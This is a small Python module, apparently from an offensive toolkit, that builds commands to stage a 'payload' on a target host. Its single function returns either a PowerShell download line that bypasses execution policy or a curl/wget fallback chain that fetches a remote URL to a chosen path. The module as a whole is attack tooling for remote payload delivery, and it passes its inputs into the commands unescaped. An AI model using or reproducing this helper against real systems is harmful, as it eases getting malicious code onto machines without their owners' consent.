"""Payload transfer helpers."""

from __future__ import annotations

__all__ = ["build_download_command"]

def build_download_command(url: str, dest: str, platform: str = "unix") -> str:
    """Build a best-effort download command for a target platform.

    Args:
        url: Remote URL to download
        dest: Destination path on target
        platform: "unix" or "windows"
    """
    platform = (platform or "").lower()
    if platform == "windows":
        return (
            "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass "
            f"-Command \"(New-Object Net.WebClient).DownloadFile('{url}', '{dest}')\""
        )
    return (
        f"(command -v curl >/dev/null && curl -fsSL '{url}' -o '{dest}') || "
        f"(command -v wget >/dev/null && wget -q '{url}' -O '{dest}')"
    )
